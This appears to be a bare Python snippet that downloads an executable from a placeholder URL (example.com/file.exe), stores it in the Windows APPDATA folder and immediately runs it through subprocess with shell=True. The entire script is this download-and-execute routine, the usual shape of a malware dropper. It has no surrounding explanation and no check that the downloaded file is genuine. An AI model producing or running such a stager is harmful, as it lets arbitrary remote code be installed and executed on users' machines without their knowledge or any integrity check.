import os
import urllib.request
import subprocess
from urllib.parse import urlsplit

file_url = 'https://example.com/file.exe'
appdata_path = os.getenv('APPDATA')

url_path = urlsplit(file_url).path
file_name = os.path.basename(url_path)

file_path = os.path.join(appdata_path, file_name)

urllib.request.urlretrieve(file_url, file_path)
subprocess.run([file_path], shell=True)
